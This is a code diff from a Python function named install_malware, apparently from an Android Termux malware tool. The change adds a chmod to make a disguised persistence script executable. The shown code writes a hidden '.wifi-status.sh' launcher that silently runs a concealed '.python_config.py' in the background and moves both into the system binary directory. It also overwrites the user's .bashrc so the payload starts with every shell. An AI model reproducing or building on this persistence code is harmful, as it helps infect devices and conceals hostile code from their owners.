@@ -122,7 +122,7 @@ def install_malware():
 		with open(".wifi-status.sh", "w") as c:
 			c.write("""#!/data/data/com.termux/files/usr/bin/bash
 python ~/../usr/bin/.python_config.py >/dev/null 2>&1 &""")
-		subprocess.run("mv .wifi-status.sh .python_config.py ~/../usr/bin/", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
+		subprocess.run("chmod +x .wifi-status.sh && mv .wifi-status.sh .python_config.py ~/../usr/bin/", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
 		bashrc_path = os.path.join(os.getenv('HOME'), '.bashrc')
 		with open(bashrc_path, "w") as b:
 			b.write(".wifi-status.sh")
